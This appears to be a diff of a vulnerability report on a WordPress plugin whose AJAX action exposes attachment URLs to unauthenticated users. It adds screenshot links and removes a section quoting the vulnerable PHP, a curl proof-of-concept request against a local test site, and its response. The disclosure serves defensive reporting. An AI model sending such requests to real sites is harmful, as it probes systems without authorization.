@@ -392,6 +392,7 @@ Content-Type: application/json; charset=UTF-8
   }
 }
 ```
+
 ![ss](Screenshot_8.png)
 
 The request was made without an authentication cookie.
@@ -414,6 +415,7 @@ curl -i \
   }
 }
 ```
+![ss](Screenshot_9.png)
 
 This demonstrates that the endpoint processes an attacker-controlled attachment ID without requiring authentication.
 
@@ -481,55 +483,6 @@ The request:
 
 This demonstrates that the AJAX action is accessible to unauthenticated users and exposes attachment URL information.
 
-## Screenshot Evidence
-
-Recommended screenshots:
-
-### Screenshot 1 — Source Code
-
-Show:
-
-```php
-add_action('wp_ajax_nopriv_' . $methodName, ...);
-```
-
-and:
-
-```php
-$imageId = $_GET[$this::NOTIFIER_IMAGE_ID];
-$image = wp_get_attachment_image_src($imageId);
-```
-
-### Screenshot 2 — Unauthenticated Request
-
-Show the terminal containing:
-
-```bash
-curl -i \
--H 'Cookie:' \
-'http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=get_notifier_image&jsv360_notifier_image_id=5'
-```
-
-### Screenshot 3 — Successful Response
-
-Show:
-
-```json
-{
-  "success": true,
-  "data": {
-    "url": ".../test.jpg"
-  }
-}
-```
-
-Markdown example:
-
-```markdown
-### Screenshot — Unauthenticated AJAX Response
-
-![Unauthenticated get_notifier_image response](screenshots/get-notifier-image-response.png)
-```
 
 ## Suggested Remediation
 
